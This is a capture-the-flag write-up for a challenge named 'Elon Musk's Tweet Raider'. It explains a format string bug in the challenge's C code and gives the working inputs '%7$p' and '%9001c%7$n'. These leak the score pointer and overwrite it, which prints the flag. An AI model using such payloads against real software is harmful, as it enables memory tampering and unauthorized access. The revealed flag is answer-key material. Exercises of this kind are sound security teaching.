# Elon Musk's Tweet Raider

Points: 100

Description: Is your tweet dank enough?
 
Creator: nsnc

# Solve

This program is vulnerable to a format string attack:
```c
printf("Your tweet:\n");
printf(tweet);

calculateScore(tweet, score);
printf("Your score: %d\n", *score);
if(*score > 9000) {
    printf("Your score is over 9000!\n");
    printf("%s\n", readFile("./flag.txt"));
}
```

Since a pointer to `score` is on the stack, an attacker can use `%p` to leak it, or `%n` to write to it.

After testing calculating offsets, an input of `%7$p` will print the heap address of the score integer.
```
Tweet: %7$p
Your tweet:
0x55cea2fdd2a0
Your score: 0
```

The format specifier `%n` will write as many characters as were printed to the memory pointed to by the coresponding argument. `%Nc` will print N spaces as padding. We can use this to write `9001` to the score variable using the format string: `%9001c%7$n`.

```
Tweet: %9001c%7$n
<snip>
LOTS OF SPACES
<snip>
Your score: 9001
Your score is over 9000!
pctf{Wh4t's_4ft3r_MAARRRZ?}
